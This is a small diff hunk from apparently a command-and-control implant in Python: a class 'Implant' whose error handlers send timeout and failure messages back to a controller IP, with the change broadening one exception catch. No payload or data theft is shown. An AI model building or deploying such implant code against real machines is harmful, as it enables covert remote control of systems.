@@ -31,7 +31,7 @@ class Implant(Host):
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
-        except subprocess.CalledProcessError:
+        except Exception:
             self.send(self.controller_ip, b'There was an error with the command', option="ERROR")
 
 if __name__ == "__main__":
